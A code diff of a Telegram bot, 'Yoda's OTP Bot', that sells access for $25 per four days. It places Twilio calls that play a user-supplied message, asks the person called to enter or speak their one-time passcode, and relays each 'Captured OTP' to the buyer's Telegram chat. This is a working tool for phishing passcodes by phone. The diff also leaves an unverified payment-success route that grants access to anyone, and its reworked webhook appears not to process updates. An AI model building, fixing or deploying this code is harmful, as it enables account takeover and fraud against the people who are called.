@@ -1,36 +1,41 @@
 import os
-import asyncio
 import requests
 from datetime import datetime, timedelta, timezone
 from flask import Flask, request, Response
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 from twilio.rest import Client
 from twilio.twiml.voice_response import VoiceResponse, Gather
 import stripe
+import urllib.parse
 
 # -------------------------
-# Environment variables (Render)
+# Environment variables
 # -------------------------
-TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")
-NGROK_URL = os.environ.get("NGROK_URL", "https://your-app.onrender.com")  # Your Render app URL
-TWILIO_ACCOUNT_SID = os.environ.get("TWILIO_ACCOUNT_SID", "YOUR_TWILIO_SID")
-TWILIO_AUTH_TOKEN = os.environ.get("TWILIO_AUTH_TOKEN", "YOUR_TWILIO_TOKEN")
-TWILIO_PHONE_NUMBER = os.environ.get("TWILIO_PHONE_NUMBER", "+10000000000")
-STRIPE_SECRET_KEY = os.environ.get("STRIPE_SECRET_KEY", "YOUR_STRIPE_SECRET")
+PORT = int(os.environ.get("PORT", 5000))
+RENDER_EXTERNAL_URL = os.environ["RENDER_EXTERNAL_URL"]
+STRIPE_SECRET_KEY = os.environ["STRIPE_SECRET_KEY"]
+TELEGRAM_TOKEN = os.environ["TELEGRAM_TOKEN"]
+TWILIO_ACCOUNT_SID = os.environ["TWILIO_ACCOUNT_SID"]
+TWILIO_AUTH_TOKEN = os.environ["TWILIO_AUTH_TOKEN"]
+TWILIO_PHONE_NUMBER = os.environ["TWILIO_PHONE_NUMBER"]
 
-# Initialize clients
+# -------------------------
+# Setup clients
+# -------------------------
 twilio_client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)
 stripe.api_key = STRIPE_SECRET_KEY
+app_telegram = Application.builder().token(TELEGRAM_TOKEN).build()
+flask_app = Flask(__name__)
 
 # -------------------------
 # State storage
 # -------------------------
-user_phone = {}          # Telegram user -> phone
-phone_to_chat = {}       # phone -> chat ID
-captured_otp = {}        # phone -> OTP
-last_message = {}        # Telegram user -> last message
-paid_users = {}          # user_id -> paid_until datetime
+user_phone = {}        # Telegram user -> phone
+phone_to_chat = {}     # phone -> Telegram chat ID
+captured_otp = {}      # phone -> OTP
+last_message = {}      # user -> last message
+paid_users = {}        # user_id -> datetime
 
 # -------------------------
 # Helpers
@@ -62,34 +67,29 @@ def create_checkout_session(user_id, customer_email=None):
         }],
         mode="payment",
         customer_email=customer_email,
-        success_url=f"{NGROK_URL}/success?user_id={user_id}",
-        cancel_url=f"{NGROK_URL}/cancel"
+        success_url=f"{RENDER_EXTERNAL_URL}/success?user_id={user_id}",
+        cancel_url=f"{RENDER_EXTERNAL_URL}/cancel"
     )
     return session.url
 
 # -------------------------
-# Telegram handlers
+# Telegram Handlers
 # -------------------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "👋 Welcome to Yoda's OTP Bot!\n\nUse the buttons below:",
+        "👋 Welcome to Yoda's OTP Bot!\nUse the buttons below:",
         reply_markup=get_main_keyboard(update.effective_user.id)
     )
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.callback_query:
-        await update.callback_query.answer()
-        chat_id = update.callback_query.message.chat.id
-    else:
-        chat_id = update.effective_chat.id
+    chat_id = update.effective_chat.id
     await context.bot.send_message(
         chat_id=chat_id,
-        text="ℹ️ *How to use this bot:*\n"
-             "1. Tap *📱 Set Phone* to save your number.\n"
-             "2. Tap *📞 Make Call* and enter your custom message.\n"
+        text="ℹ️ How to use this bot:\n"
+             "1. Tap 📱 Set Phone to save your number.\n"
+             "2. Tap 📞 Make Call and send your custom message.\n"
              "3. The bot will call you and capture the OTP.\n"
-             "4. You’ll get the OTP back in this chat ✅",
-        parse_mode="Markdown",
+             "4. OTP is sent back here.",
         reply_markup=get_main_keyboard(update.effective_user.id)
     )
 
@@ -99,25 +99,30 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = query.from_user.id
 
     if query.data == "pay":
-        checkout_url = create_checkout_session(user_id=uid)
-        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"💳 Complete payment here: {checkout_url}")
+        checkout_url = create_checkout_session(uid)
+        await context.bot.send_message(chat_id=uid, text=f"💳 Complete payment: {checkout_url}")
         return
 
     if query.data in ["setphone", "call"] and not is_paid(uid):
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="💰 You must pay $25 for 4 days to use this feature.")
+        await context.bot.send_message(chat_id=uid, text="💰 You must pay $25 for 4 days to use this feature.")
         return
 
     if query.data == "setphone":
-        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back to Menu", callback_data="menu")]])
-        await query.edit_message_text("📱 Please send your phone number (+1XXXXXXXXXX):", parse_mode="Markdown", reply_markup=keyboard)
+        await query.edit_message_text(
+            "📱 Send your phone number in format: `+1XXXXXXXXXX`",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data="menu")]])
+        )
         context.user_data["awaiting_phone"] = True
 
     elif query.data == "call":
         if uid not in user_phone:
-            await query.edit_message_text("⚠️ Please set your phone first with 📱 Set Phone.", reply_markup=get_main_keyboard(uid))
+            await query.edit_message_text("⚠️ Set your phone first.", reply_markup=get_main_keyboard(uid))
         else:
-            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back to Menu", callback_data="menu")]])
-            await query.edit_message_text("📞 Send your custom message for the call or type /call to reuse your last message.", reply_markup=keyboard)
+            await query.edit_message_text(
+                "📞 Send your custom call message or use /call to reuse last one.",
+                reply_markup=get_main_keyboard(uid)
+            )
             context.user_data["awaiting_message"] = True
 
     elif query.data == "help":
@@ -131,7 +136,7 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
 
     if not is_paid(uid):
-        await update.message.reply_text("💰 You must pay $25 for 4 days to use this feature.")
+        await update.message.reply_text("💰 You must pay $25 for 4 days.")
         return
 
     if context.user_data.get("awaiting_phone"):
@@ -148,51 +153,49 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         twilio_client.calls.create(
             to=phone,
             from_=TWILIO_PHONE_NUMBER,
-            url=f"{NGROK_URL}/voice?msg={requests.utils.quote(text)}",
-            status_callback=f"{NGROK_URL}/call_status",
+            url=f"{RENDER_EXTERNAL_URL}/voice?msg={urllib.parse.quote(text)}",
+            status_callback=f"{RENDER_EXTERNAL_URL}/call_status",
             status_callback_event=['initiated','ringing','answered','completed','no-answer'],
             status_callback_method='POST'
         )
-        await update.message.reply_text(f"📞 Calling {phone} now with your message...")
+        await update.message.reply_text(f"📞 Calling {phone} now...")
         return
 
     if text == "/call":
         if uid not in last_message or uid not in user_phone:
-            await update.message.reply_text("⚠️ Set phone or send a message first.")
+            await update.message.reply_text("⚠️ Send a message first and set phone.")
             return
         phone = user_phone[uid]
         twilio_client.calls.create(
             to=phone,
             from_=TWILIO_PHONE_NUMBER,
-            url=f"{NGROK_URL}/voice?msg={requests.utils.quote(last_message[uid])}",
-            status_callback=f"{NGROK_URL}/call_status",
+            url=f"{RENDER_EXTERNAL_URL}/voice?msg={urllib.parse.quote(last_message[uid])}",
+            status_callback=f"{RENDER_EXTERNAL_URL}/call_status",
             status_callback_event=['initiated','ringing','answered','completed','no-answer'],
             status_callback_method='POST'
         )
-        await update.message.reply_text(f"📞 Re-calling {phone} with your last message...")
+        await update.message.reply_text(f"📞 Recalling {phone} with last message...")
 
 # -------------------------
-# Flask server
+# Telegram webhook route
 # -------------------------
-flask_app = Flask(__name__)
-app_telegram = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
-app_telegram.add_handler(CommandHandler("start", start))
-app_telegram.add_handler(CallbackQueryHandler(handle_buttons))
-app_telegram.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
-
 @flask_app.route(f"/{TELEGRAM_TOKEN}", methods=["POST"])
 def telegram_webhook():
     update = Update.de_json(request.get_json(force=True), app_telegram.bot)
-    asyncio.run(app_telegram.process_update(update))
+    import asyncio
+    asyncio.run(app_telegram.update_queue.put(update))
     return "OK"
 
-@flask_app.route("/voice", methods=["POST", "GET"])
+# -------------------------
+# Twilio & Stripe Flask routes
+# -------------------------
+@flask_app.route("/voice", methods=["POST","GET"])
 def voice():
     message = request.args.get("msg", "Please enter your OTP now.")
     resp = VoiceResponse()
     gather = Gather(input="dtmf speech", timeout=10, num_digits=6, action="/capture", method="POST")
     gather.say(message)
-    gather.say("Please enter or speak your OTP.")
+    gather.say("Now, enter or speak your OTP.")
     resp.append(gather)
     resp.say("No input received. Goodbye!")
     return Response(str(resp), mimetype="text/xml")
@@ -205,42 +208,48 @@ def capture():
 
     chat_id = phone_to_chat.get(phone)
     if chat_id:
-        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", data={"chat_id": chat_id, "text": f"📩 Captured OTP: {otp}"})
-
+        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                      data={"chat_id": chat_id, "text": f"📩 Captured OTP: {otp}"})
     resp = VoiceResponse()
     resp.say("Thanks! OTP captured. Goodbye!")
     return Response(str(resp), mimetype="text/xml")
 
 @flask_app.route("/call_status", methods=["POST"])
 def call_status():
-    call_status_val = request.values.get("CallStatus")
+    call_status = request.values.get("CallStatus")
     to_number = request.values.get("To")
     chat_id = phone_to_chat.get(to_number)
     if chat_id:
         status_map = {
-            "initiated":"📞 Call initiated",
-            "ringing":"📲 Ringing",
-            "answered":"✅ Answered",
-            "completed":"📴 Completed",
-            "no-answer":"❌ No answer"
+            "initiated": "📞 Call initiated.",
+            "ringing": "📲 Ringing.",
+            "answered": "✅ Answered.",
+            "completed": "📴 Completed.",
+            "no-answer": "❌ No answer."
         }
-        msg = status_map.get(call_status_val, f"ℹ️ Status: {call_status_val}")
-        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", data={"chat_id": chat_id, "text": msg})
+        msg = status_map.get(call_status, f"ℹ️ Status: {call_status}")
+        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                      data={"chat_id": chat_id, "text": msg})
     return ("", 204)
 
 @flask_app.route("/success")
 def payment_success():
     user_id = int(request.args.get("user_id", 0))
     paid_users[user_id] = datetime.now(timezone.utc) + timedelta(days=4)
-    return f"✅ Payment received! Access granted for 4 days."
+    return f"✅ Payment received! User {user_id} has 4-day access."
 
 @flask_app.route("/cancel")
 def payment_cancel():
-    return "Payment canceled. You do not have access."
+    return "Payment canceled."
 
 # -------------------------
-# Run Flask (Render will assign PORT)
+# Run Flask server
 # -------------------------
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 10000))
-    flask_app.run(host="0.0.0.0", port=port)
+    # Add handlers
+    app_telegram.add_handler(CommandHandler("start", start))
+    app_telegram.add_handler(CallbackQueryHandler(handle_buttons))
+    app_telegram.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
+
+    # Run Flask server (Render will handle PORT)
+    flask_app.run(host="0.0.0.0", port=PORT)
